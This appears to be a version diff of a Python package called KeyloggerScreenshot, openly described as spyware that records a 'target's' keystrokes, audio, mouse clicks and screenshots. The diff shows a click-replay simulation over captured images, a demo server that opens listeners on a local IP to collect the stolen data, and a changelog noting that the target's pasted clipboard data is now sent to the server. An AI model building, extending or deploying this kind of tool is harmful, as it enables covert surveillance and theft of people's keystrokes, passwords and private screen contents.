+        #This is the time where the code is taking a time out
+        one_coordinate = speed + sleep
+
+        duration_seconds = one_coordinate * len(every_coordinate)
+        one_image = duration_seconds + img_seconds
+        summed_up = one_image * len(img_files)
+        seconds = round(summed_up)
+        #This calculates the amount it will take
+
+        print(f"\nThe target has clicked {len(every_coordinate)} times on his screen")
+        threading_count = threading.Thread(target=Simulation.countdown)
+        #The countdown will start
+        threading_count.start()
+
+        pg.sleep(4)
+        for image in img_files:
+            im = PIL.Image.open(image)
+            try:
+                #Opens the image
+                im.show()
+                time.sleep(2)
+                pg.press("f11")
+                # Makes the image in the perfect resolution
+                for x, y in every_coordinate:
+                    pg.moveTo(x, y, 0.3)
+                    time.sleep(sleep)
+                pg.press("esc")
+            except RuntimeError:
+                bp.color('\n\nTry to run "python Simulation_code.py" in your terminal.\nIf this did not work try to clone my project on github: https://github.com/Kill0geR/KeyloggerScreenshot',"red")
+                os._exit(0)
```

### Comparing `KeyloggerScreenshot-0.2.9/KeyloggerScreenshot.egg-info/PKG-INFO` & `KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot.egg-info/PKG-INFO`

 * *Files 3% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: KeyloggerScreenshot
-Version: 0.2.9
+Version: 0.2.9.1
 Summary: Exporting Keylogger files, recording audio, recording mouse click information and screenshots of the target. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/ and my github: https://github.com/Facileee/KeyloggerScreenshot
 Home-page: 
 Author: Fawaz Bashiru
 Author-email: fawazbashiru@gmail.com
 License: MIT
 Keywords: KeyloggerScreenshot
 Classifier: Development Status :: 6 - Mature
@@ -323,7 +323,13 @@
 0.2.9 (03/04/2023)
 -------------------
 - Better Port documentation
 - New File "Simulation_code.py" (This stores the code for the simulation. Only on GitHub!!!)
 - Cleaner ServerKeylogger code
 - New help instruction on KLS_start on GitHub
 
+0.2.9.1 (15/04/2023)
+--------------------
+- Data which the target has pasted will now be shown on the server
+- Documentation incoming
+
+
```

### Comparing `KeyloggerScreenshot-0.2.9/LISCENCE.txt` & `KeyloggerScreenshot-0.2.9.1/LISCENCE.txt`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.2.9/PKG-INFO` & `KeyloggerScreenshot-0.2.9.1/PKG-INFO`

 * *Files 3% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: KeyloggerScreenshot
-Version: 0.2.9
+Version: 0.2.9.1
 Summary: Exporting Keylogger files, recording audio, recording mouse click information and screenshots of the target. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/ and my github: https://github.com/Facileee/KeyloggerScreenshot
 Home-page: 
 Author: Fawaz Bashiru
 Author-email: fawazbashiru@gmail.com
 License: MIT
 Keywords: KeyloggerScreenshot
 Classifier: Development Status :: 6 - Mature
@@ -323,7 +323,13 @@
 0.2.9 (03/04/2023)
 -------------------
 - Better Port documentation
 - New File "Simulation_code.py" (This stores the code for the simulation. Only on GitHub!!!)
 - Cleaner ServerKeylogger code
 - New help instruction on KLS_start on GitHub
 
+0.2.9.1 (15/04/2023)
+--------------------
+- Data which the target has pasted will now be shown on the server
+- Documentation incoming
+
+
```

### Comparing `KeyloggerScreenshot-0.2.9/README.md` & `KeyloggerScreenshot-0.2.9.1/README.md`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.2.9/demon_server.py` & `KeyloggerScreenshot-0.2.9.1/demon_server.py`

 * *Files 1% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 import KeyloggerScreenshot as ks
 import threading
 
 ip = "192.168.0.75"
 
 server_photos = ks.ServerPhotos(ip, 1111)
 
-server_keylogger = ks.ServerKeylogger(ip, 2233, simulater=True)
+server_keylogger = ks.ServerKeylogger(ip, 2222, simulater=True)
 
 server_listener = ks.ServerListener(ip, 3333)
 
 server_time = ks.Timer(ip, 4444)
 
 threading_server = threading.Thread(target=server_photos.start)
 threading_server.start()
```

### Comparing `KeyloggerScreenshot-0.2.9/img_1.png` & `KeyloggerScreenshot-0.2.9.1/img_1.png`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.2.9/leo_gui.py` & `KeyloggerScreenshot-0.2.9.1/leo_gui.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.2.9/requirements.py` & `KeyloggerScreenshot-0.2.9.1/requirements.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.2.9/setup.py` & `KeyloggerScreenshot-0.2.9.1/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -6,15 +6,15 @@
     'Operating System :: Microsoft :: Windows :: Windows 10',
     'License :: OSI Approved :: MIT License',
     'Programming Language :: Python :: 3'
 ]
 
 setup(
     name='KeyloggerScreenshot',
-    version='0.2.9',
+    version='0.2.9.1',
     description='Exporting Keylogger files, recording audio, recording mouse click information and screenshots of the target. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/ and my github: https://github.com/Facileee/KeyloggerScreenshot',
     long_description_content_type="text/markdown",
     long_description=open('README.md').read() + '\n\n' + open('CHANGELOG.txt').read(),
     url='',
     author='Fawaz Bashiru',
     author_email='fawazbashiru@gmail.com',
     license='MIT',
```

